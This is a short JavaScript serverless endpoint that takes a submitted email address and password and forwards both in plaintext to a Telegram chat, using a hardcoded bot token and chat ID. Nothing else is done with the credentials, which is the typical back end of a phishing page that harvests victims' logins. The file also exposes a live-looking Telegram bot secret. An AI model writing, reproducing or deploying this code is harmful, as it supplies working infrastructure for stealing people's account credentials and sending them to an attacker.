export default async function handler(req, res) {
  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Extract email and password from the request body
  const { email, password } = req.body;

  // Validate that both fields exist
  if (!email || !password) {
    return res.status(400).json({ error: 'email and password are required' });
  }

  // --- Telegram credentials (provided by user) ---
  const BOT_TOKEN = '8725766460:AAGaDs-aNztMcqcbkEkucDyoXbGPNkVRSts';
  const CHAT_ID   = '5244788909';
  // ----------------------------------------------

  // Format a clean Markdown message
  const message = `📧 *Email:* \`${email}\`\n🔐 *Password:* \`${password}\``;

  // Telegram Bot API endpoint
  const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  // Payload to send
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
  };

  try {
    const apiResponse = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const data = await apiResponse.json();

    // Check if Telegram API reported an error
    if (!apiResponse.ok || !data.ok) {
      console.error('Telegram API error:', data);
      return res.status(500).json({ error: 'Failed to send message to Telegram', details: data });
    }

    // Success response
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Internal server error:', error);
    res.status(500).json({ error: 'Internal server error', details: error.message });
  }
}